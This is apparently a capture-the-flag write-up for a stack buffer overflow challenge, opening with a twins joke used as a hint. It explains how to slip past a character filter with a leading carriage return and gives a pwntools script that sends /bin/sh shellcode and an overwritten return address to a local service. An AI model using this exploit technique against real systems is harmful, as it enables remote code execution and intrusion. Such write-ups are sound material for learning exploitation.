 * A woman has twins and gives them up for adoption.
 *
 * One of them goes to a family in Egypt and is named Amal. The other goes to a
 * family in Spain. They name him Juan.
 *
 * Years later, Juan sends a picture of himself to his birth mother. Upon
 * receiving the picture, she tells her husband that she wishes she also had a
 * picture of Amal. He responds, "They're twins! If you've seen Juan, you've
 * seen Amal."

## Solution

As we can see there is a get with a controll on the char that we can use, to resome we can not use:

 * '0x0'
 * '0xa' - '0xd', '\n' and '\r'
 * '0x61' - '0x7a' that will be subtract '0x20'

Using gdb we can see that the distance between the RIP and the start of the buffer is 0x214 (532). Now we need a sheelcode that is smoller than 532 bytes and doesn't contains that particular char. After some time i saw that the uppercase part use strlen, so we just need to start the payload with a '\r', not '\n', because the get will stop instead.

```
from pwn import *
import struct

def main():
    conn = remote('127.0.0.1', 64013)
    print(conn.recvline())
    payload = "\r" + b'\x90' * 20
    payload += asm(shellcraft.i386.linux.sh())
    payload += b'\x90' * (532 - len(payload))
    payload += struct.pack("<I", 0xffffdb20) + "\n"
    conn.send(payload)
    conn.interactive()

main()
```
